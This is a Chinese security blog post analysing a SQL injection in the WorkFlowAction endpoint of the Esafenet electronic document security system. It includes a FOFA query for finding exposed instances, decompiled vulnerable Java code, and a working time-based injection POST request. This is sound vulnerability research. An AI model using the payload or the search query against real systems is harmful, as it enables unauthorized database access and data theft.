---
title: "亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞"
source: https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html
asset_dir: assets/亿赛通电子文档安全管理系统-workflowaction-sql注入漏洞
---

# 亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/24 12:21
* 968浏览
* [0评论](#comment)
* 32分钟阅读

深入探索

SQL

计算机安全

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

亿赛通电子文档安全管理系统的WorkFlowAction接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可以通过构造特定的POST请求，在flowId参数中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

文件大小转换

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

根据 web.xml 里对 `WorkFlowAction` 的定义

```
<servlet>
    <servlet-name>WorkFlowAction</servlet-name>
    <servlet-class>com.esafenet.mobile.WorkFlowAction</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>WorkFlowAction</servlet-name>
    <url-pattern>/3g/WorkFlowAction</url-pattern>
</servlet-mapping>
```

可知，访问路由为 /3g/WorkFlowAction ，具体实现逻辑类为 `com.esafenet.mobile.WorkFlowAction` ，跟进查看`Approval`实现方式

SQL注入防护

深入探索

sql

数据库

漏洞扫描器

```
public void actionApproval(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String fromurl = RequestUtil.getParameter(request, "fromurl", "");
        String flowId = RequestUtil.getParameter(request, "flowId", "");
        String opinion = RequestUtil.getParameter(request, "opinion", "");
        String approvalResult = RequestUtil.getParameter(request, "approvalResult", "");

        try {
            String userName = CDGUtil.getUserName(request);
            PageBean pageBean = new PageBean();
            pageBean.setCmd("updateOne");
            pageBean.setUsername(userName);
            pageBean.setToken("FEGBFCFEFAFKFCGC");
            pageBean.setFlowId(flowId);
            pageBean.setPasstype(approvalResult);
            pageBean.setComments(opinion);
            this.doworkflow.doProcessWork(pageBean);
        } catch (Exception e) {
            log.error("3g approval error:" + e);
        }

        request.getRequestDispatcher(fromurl).forward(request, response);
    }
```

深入探索

网络安全会议

Docker加速服务

网络安全课程

将请求的参数这些带入`doProcessWork`方法

```
public PageBean doProcessWork(PageBean pageBean) throws Exception {
    try {
        String websendmail_ip = UserCache.weburlmap.get("httpserverIp") == null ? "127.0.0.1" : (String)UserCache.weburlmap.get("httpserverIp");
        String websendmail_port = UserCache.weburlmap.get("httpserverPort") == null ? "80" : (String)UserCache.weburlmap.get("httpserverPort");
        String flowId = pageBean.getFlowId();
        FlowDetail detail = this.dao.getAngecyflag(pageBean.getUsername(), flowId);
```

`flowId` 会被带入`getAngecyflag` 方法，跟进看下其实现逻辑

代码安全审计

```
public FlowDetail getAngecyflag(String username, String flowid) {
    Connection conn = null;
    PreparedStatement ps = null;
    ResultSet rs = null;
    StringBuffer sql = new StringBuffer("select fd.* from  workflowDetail fd where fd.approvaler='" + username + "' AND fd.dstatus ='1' AND flowID='" + flowid + "'");
    FlowDetail flowDetail = new FlowDetail();
    FlowDetail flowDetail = new FlowDetail();

    try {
        conn = DbConnectionManager.getConnection();
        ps = conn.prepareStatement(sql.toString());
        rs = ps.executeQuery();
```

可见参数`flowId`全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
Host: esafenet.mrxn.net
Content-Type: application/x-www-form-urlencoded

command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a4'--
```

[![亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞](images/img-001-77f2cff97cd1.webp)](https://image.mrxn.net/124aae559a9e4373ac4ec0c9dd2340b9.webp)

成功延时 4 秒

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞](https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html)  
文章链接：<https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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